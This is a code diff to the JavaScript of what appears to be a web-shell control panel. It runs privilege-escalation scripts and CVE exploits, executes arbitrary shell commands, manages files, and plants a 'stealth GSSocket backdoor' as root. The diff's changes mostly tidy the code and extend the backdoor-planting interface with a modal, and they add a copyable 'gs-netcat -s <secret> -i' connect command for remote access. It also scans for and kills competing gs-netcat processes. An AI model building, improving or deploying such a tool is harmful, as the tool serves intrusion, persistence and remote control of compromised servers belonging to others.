@@ -22,9 +22,7 @@ function closeModal(id){$(id).classList.remove('on');}
 // Session Timer
 async function updateSessionTimer(){
     const r=await api('timer');
-    if(r.remaining!==undefined){
-        sessionRemaining=r.remaining;
-    }
+    if(r.remaining!==undefined)sessionRemaining=r.remaining;
 }
 
 function renderTimer(){
@@ -43,7 +41,6 @@ function renderTimer(){
 
 // Initialize
 async function init(){
-    // Get session timer
     await updateSessionTimer();
     setInterval(renderTimer,1000);
     setInterval(updateSessionTimer,60000);
@@ -145,11 +142,7 @@ function initMethodCards(){
     $('method-list').innerHTML=h;
 }
 
-function toggleMethod(idx){
-    const card=$('mc-'+idx);
-    card.classList.toggle('expanded');
-}
-
+function toggleMethod(idx){$('mc-'+idx).classList.toggle('expanded');}
 function clearMethod(idx){
     $('mout-'+idx).textContent='Click "Run" to execute this check';
     $('mstat-'+idx).textContent='pending';
@@ -170,7 +163,6 @@ async function runSingleMethod(idx){
     const r=await api('run',{path:'lpe_methods/'+m.id+'.sh'});
     const output=r.output||'No output';
     
-    // Format output with colors
     let formatted=output.split('\n').map(line=>{
         if(line.includes('[+]'))return `<span style="color:var(--green)">${line}</span>`;
         if(line.includes('[-]'))return `<span style="color:var(--red)">${line}</span>`;
@@ -182,61 +174,29 @@ async function runSingleMethod(idx){
     out.innerHTML=`<pre style="margin:0;white-space:pre-wrap">${formatted}</pre>`;
     methodResults[idx]=output;
     
-    // Determine status
     if(output.includes('[+]')||output.includes('SUCCESS')||output.includes('VULNERABLE')||output.includes('ROOT_SECRET')){
-        stat.textContent='success';
-        stat.className='method-status success';
+        stat.textContent='success';stat.className='method-status success';
     }else if(output.includes('[!]')||output.includes('found')||output.includes('READABLE')||output.includes('WRITABLE')){
-        stat.textContent='partial';
-        stat.className='method-status partial';
+        stat.textContent='partial';stat.className='method-status partial';
     }else{
-        stat.textContent='clean';
-        stat.className='method-status failed';
+        stat.textContent='clean';stat.className='method-status failed';
     }
     
-    // Check for root secret
     if(output.includes('ROOT_SECRET:')){
         const match=output.match(/ROOT_SECRET:([^\s\n]+)/);
         if(match){
             $('root-success').style.display='flex';
             $('root-success-msg').textContent='Method: '+m.name;
-            $('root-result').innerHTML=`
-                <div class="root-box">
-                    <h3>🎉 ROOT BACKDOOR PLANTED!</h3>
-                    <p style="font-size:11px;color:var(--text)">Stealth GSSocket backdoor installed as root.</p>
-                    <code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${match[1]} -i</code>
-                </div>`;
+            $('root-result').innerHTML=`<div class="root-box"><h3>🎉 ROOT BACKDOOR!</h3><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${match[1]} -i</code></div>`;
         }
     }
 }
 
 async function runAllMethods(){
-    $('btn-autoroot').disabled=true;
-    $('btn-autoroot').textContent='Running...';
-    $('root-success').style.display='none';
-    $('root-result').innerHTML='';
-    
-    for(let i=0;i<LPE_METHODS.length;i++){
-        await runSingleMethod(i);
-        await new Promise(r=>setTimeout(r,300));
-    }
-    
-    $('btn-autoroot').disabled=false;
-    $('btn-autoroot').textContent='🚀 Run All';
-    
-    // Summary
-    let success=0,partial=0;
-    for(let i=0;i<20;i++){
-        const stat=$('mstat-'+i)?.textContent;
-        if(stat==='success')success++;
-        if(stat==='partial')partial++;
-    }
-    
-    if(success===0&&partial===0){
-        $('root-result').innerHTML=`<div class="alert"><span class="alert-icon">✓</span><div class="alert-text"><strong>System appears hardened</strong>No obvious privilege escalation vectors found.</div></div>`;
-    }else if(success===0){
-        $('root-result').innerHTML=`<div class="alert" style="background:rgba(245,158,11,0.1);border-color:rgba(245,158,11,0.2)"><span class="alert-icon">⚠️</span><div class="alert-text"><strong>${partial} Potential Vectors</strong>Review partial findings for manual exploitation.</div></div>`;
-    }
+    $('btn-autoroot').disabled=true;$('btn-autoroot').textContent='Running...';
+    $('root-success').style.display='none';$('root-result').innerHTML='';
+    for(let i=0;i<LPE_METHODS.length;i++){await runSingleMethod(i);await new Promise(r=>setTimeout(r,300));}
+    $('btn-autoroot').disabled=false;$('btn-autoroot').textContent='🚀 Run All';
 }
 
 // Exploits
@@ -248,23 +208,13 @@ async function loadExp(){
         let h='';
         (d.exploits||[]).forEach(x=>{
             const c=x.rate>=80?'var(--green)':'var(--gold)';
-            h+=`<div class="method-card">
-                <div class="method-header" onclick="runExp('${x.cve}')">
-                    <span style="color:var(--gold);font-family:'JetBrains Mono';font-size:12px">${x.cve}</span>
-                    <span class="method-name">${x.name}</span>
-                    <span style="color:${c};font-size:12px">${x.rate}%</span>
-                </div>
-            </div>`;
+            h+=`<div class="method-card"><div class="method-header" onclick="runExp('${x.cve}')"><span style="color:var(--gold);font-size:12px">${x.cve}</span><span class="method-name">${x.name}</span><span style="color:${c};font-size:12px">${x.rate}%</span></div></div>`;
         });
         $('exp-list').innerHTML=h||'No exploits';
     }catch(e){$('exp-list').innerHTML='Error';}
 }
 
-async function runExp(cve){
-    if(!confirm('Run '+cve+'?'))return;
-    const r=await api('run',{path:'exploits/'+cve+'/run.sh'});
-    alert(r.output||'Done');
-}
+async function runExp(cve){if(!confirm('Run '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');}
 
 // Terminal
 async function rs(path){
@@ -275,25 +225,19 @@ async function rs(path){
 }
 
 function addLine(el,t,c){
-    const d=document.createElement('div');
-    d.className='ln '+(c||'');
-    d.textContent=t;
-    $(el).appendChild(d);
-    $(el).scrollTop=1e9;
+    const d=document.createElement('div');d.className='ln '+(c||'');d.textContent=t;
+    $(el).appendChild(d);$(el).scrollTop=1e9;
 }
 
 async function termExec(){
-    const c=$('term-cmd').value.trim();
-    if(!c)return;
-    $('term-cmd').value='';
-    addLine('term-out','$ '+c,'cmd');
+    const c=$('term-cmd').value.trim();if(!c)return;
+    $('term-cmd').value='';addLine('term-out','$ '+c,'cmd');
     const r=await api('exec',{cmd:c});
     (r.output||'').split('\n').forEach(l=>addLine('term-out',l,''));
 }
 
 async function loadProc(){
-    $('proc-out').innerHTML='';
-    addLine('proc-out','$ ps aux --sort=-%mem','cmd');
+    $('proc-out').innerHTML='';addLine('proc-out','$ ps aux --sort=-%mem','cmd');
     const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -40'});
     (r.output||'').split('\n').forEach(l=>addLine('proc-out',l,''));
 }
@@ -311,26 +255,17 @@ async function fmLoad(path){
     
     const r=await api('files',{path});
     let h='';
-    
     if(path!=='/'){
         const pr=path.split('/').slice(0,-1).join('/')||'/';
         h+=`<div class="fm-item" ondblclick="fmLoad('${pr}')"><div class="fm-icon dir">⬆</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;
     }
-    
     const files=(r.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name));
     const icons={sh:'⚡',py:'🐍',js:'📜',c:'©',txt:'📝',conf:'⚙',gz:'📦',tar:'📦'};
-    
     files.forEach(f=>{
         const fp=path==='/'?'/'+f.name:path+'/'+f.name;
         const isDir=f.type==='dir';
         const ext=f.name.split('.').pop().toLowerCase();
-        h+=`<div class="fm-item" ondblclick="${isDir?`fmLoad('${fp}')`:`fmView('${fp}')`}" oncontextmenu="fmCtx(event,'${fp}')">
-            <div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div>
-            <div class="fm-info">
-                <div class="fm-name">${f.name}</div>
-                <div class="fm-meta">${f.perm||''} • ${f.size||''}</div>
-            </div>
-        </div>`;
+        h+=`<div class="fm-item" ondblclick="${isDir?`fmLoad('${fp}')`:`fmView('${fp}')`}" oncontextmenu="fmCtx(event,'${fp}')"><div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} • ${f.size||''}</div></div></div>`;
     });
     $('fm-list').innerHTML=h||'Empty';
 }
@@ -346,13 +281,13 @@ async function fmSaveNew(){const n=$('modal-new-name').value.trim();if(!n)return
 async function fmDelete(path){if(!confirm('Delete?'))return;await api('delete',{path});fmRefresh();}
 function fmCtx(e,path){e.preventDefault();const c=prompt('1=View 2=Edit 3=Delete');if(c==='1')fmView(path);else if(c==='2')fmEdit(path);else if(c==='3')fmDelete(path);}
 
-// GSSocket Monitor
+// GSSocket Monitor - IMPROVED UX
 async function gsScan(){
     $('gs-list').innerHTML='<div style="padding:20px;text-align:center;color:var(--dim)">Scanning...</div>';
     const r=await api('run',{path:'scripts/gscan.sh'});
     
     try{
-        const d=JSON.parse(r.output||'{}');
+        const d=JSON.parse(r.output||'{"gsockets":[]}');
         const items=d.gsockets||[];
         const procs=items.filter(g=>g.type==='process');
         
@@ -368,57 +303,98 @@ async function gsScan(){
                 h+=`<div class="gs-card hostile">
                     <div class="gs-header">
                         <span class="gs-badge hostile">PROCESS</span>
-                        <span class="gs-secret">${g.secret||'hidden'}</span>
-                        <button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button>
+                        <span class="gs-pid">PID: ${g.pid}</span>
                     </div>
                     <div class="gs-body">
-                        <table>
-                            <tr><td>PID</td><td>${g.pid}</td></tr>
-                            <tr><td>User</td><td>${g.user}</td></tr>
-                            <tr><td>Mode</td><td>${g.mode}</td></tr>
-                        </table>
+                        <div class="gs-row"><span>User:</span><span>${g.user||'-'}</span></div>
+                        <div class="gs-row"><span>Secret:</span><span class="gs-secret">${g.secret||'hidden'}</span></div>
+                        <div class="gs-row"><span>Mode:</span><span>${g.mode||'-'}</span></div>
+                        ${g.secret?`<div class="gs-row"><span>Connect:</span><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${g.secret} -i</code></div>`:''}
+                    </div>
+                    <div class="gs-actions">
+                        <button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button>
+                    </div>
+                </div>`;
+            }else if(g.type==='secret_file'){
+                h+=`<div class="gs-card">
+                    <div class="gs-header"><span class="gs-badge">SECRET FILE</span></div>
+                    <div class="gs-body">
+                        <div class="gs-row"><span>Path:</span><span>${g.path}</span></div>
+                        <div class="gs-row"><span>Secret:</span><span class="gs-secret">${g.secret||'-'}</span></div>
+                        <div class="gs-row"><span>Owner:</span><span>${g.owner||'-'}</span></div>
                     </div>
                 </div>`;
             }else{
-                h+=`<div class="gs-card hostile">
-                    <div class="gs-header">
-                        <span class="gs-badge hostile">${(g.type||'').toUpperCase()}</span>
-                        <span class="gs-secret">${g.path||''}</span>
+                h+=`<div class="gs-card">
+                    <div class="gs-header"><span class="gs-badge">${(g.type||'').toUpperCase()}</span></div>
+                    <div class="gs-body">
+                        <div class="gs-row"><span>Info:</span><span>${g.path||g.entry||'-'}</span></div>
                     </div>
-                    <div class="gs-body"><table><tr><td>Owner</td><td>${g.owner||'-'}</td></tr></table></div>
                 </div>`;
             }
         });
         
         $('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No GSockets found</div>';
     }catch(e){
-        $('gs-list').innerHTML='<div style="padding:20px;color:var(--red)">Error parsing results</div>';
+        // Show raw output if JSON parse fails
+        $('gs-list').innerHTML=`<div style="padding:20px"><div style="color:var(--red);margin-bottom:10px">Parse error - Raw output:</div><pre style="background:#000;padding:10px;border-radius:4px;overflow:auto;max-height:300px;font-size:11px">${r.output||'No output'}</pre></div>`;
     }
 }
 
 async function gsKill(pid){await api('exec',{cmd:'kill -9 '+pid});setTimeout(gsScan,500);}
-async function gsKillAll(){if(!confirm('Kill ALL gs-netcat?'))return;await api('exec',{cmd:"pkill -9 -f gs-netcat"});setTimeout(gsScan,500);}
+async function gsKillAll(){if(!confirm('Kill ALL gs-netcat/defunct?'))return;await api('exec',{cmd:"pkill -9 -f 'gs-netcat|defunct'"});setTimeout(gsScan,500);}
 
+// Plant Stealth - Better UX with modal
 async function gsPlant(){
-    const s=prompt('Secret (empty=random):');
-    $('gs-list').innerHTML='<div style="padding:20px;text-align:center;color:var(--gold)">Planting stealth backdoor...</div>';
+    const secret=prompt('Secret (empty=random):');
     
-    const r=await api('run',{path:'scripts/gs_implant.sh '+(s||'')});
+    // Show loading in modal
+    $('gs-plant-result').innerHTML='<div style="text-align:center;padding:20px;color:var(--gold)">🔄 Planting stealth backdoor...</div>';
+    openModal('modal-gsplant');
+    
+    const r=await api('run',{path:'scripts/gs_implant.sh '+(secret||'')});
     
     try{
-        const lines=r.output.split('\n');
-        const lastJson=lines.filter(l=>l.startsWith('{')).pop();
-        const d=JSON.parse(lastJson||'{}');
+        // Try to parse last line as JSON
+        const lines=(r.output||'').trim().split('\n');
+        const jsonLine=lines[lines.length-1];
+        const d=JSON.parse(jsonLine);
         
         if(d.status==='success'){
-            alert(`✅ STEALTH BACKDOOR PLANTED!\n\nSecret: ${d.secret}\nInstances: ${d.instances}\nPersistence: ${d.persistence||'none'}\n\nConnect:\n${d.connect}\n\nFeatures:\n${(d.features||[]).join(', ')}`);
+            $('gs-plant-result').innerHTML=`
+                <div class="gs-success-box">
+                    <div style="font-size:24px;margin-bottom:10px">✅</div>
+                    <h3 style="color:var(--green);margin-bottom:16px">Stealth Backdoor Planted!</h3>
+                    <div class="gs-info-grid">
+                        <div class="gs-info-row"><span>Secret:</span><span class="gs-secret-big">${d.secret}</span></div>
+                        <div class="gs-info-row"><span>Binary:</span><span>${d.binary}</span></div>
+                        <div class="gs-info-row"><span>Instances:</span><span>${d.instances}</span></div>
+                        <div class="gs-info-row"><span>PIDs:</span><span>${d.pids||'-'}</span></div>
+                    </div>
+                    <div style="margin-top:16px;padding:12px;background:#000;border-radius:8px">
+                        <div style="color:var(--dim);font-size:10px;margin-bottom:4px">CONNECT COMMAND (click to copy)</div>
+                        <code onclick="navigator.clipboard.writeText(this.textContent)" style="font-size:12px;cursor:pointer">${d.connect}</code>
+                    </div>
+                    <div style="margin-top:12px;font-size:11px;color:var(--dim)">
+                        Features: ${(d.features||[]).join(', ')}
+                    </div>
+                </div>`;
         }else{
-            alert('Error: '+(d.message||r.output));
+            throw new Error(d.message||'Unknown error');
         }
     }catch(e){
-        alert('Result:\n'+r.output);
+        $('gs-plant-result').innerHTML=`
+            <div style="text-align:center;padding:20px">
+                <div style="font-size:24px;margin-bottom:10px">❌</div>
+                <h3 style="color:var(--red);margin-bottom:16px">Plant Failed</h3>
+                <div style="color:var(--dim);margin-bottom:16px">${e.message}</div>
+                <div style="text-align:left;background:#000;padding:10px;border-radius:4px;max-height:200px;overflow:auto">
+                    <pre style="font-size:10px;margin:0">${r.output||'No output'}</pre>
+                </div>
+            </div>`;
     }
-    gsScan();
+    
+    setTimeout(gsScan,1000);
 }
 
 // Actions
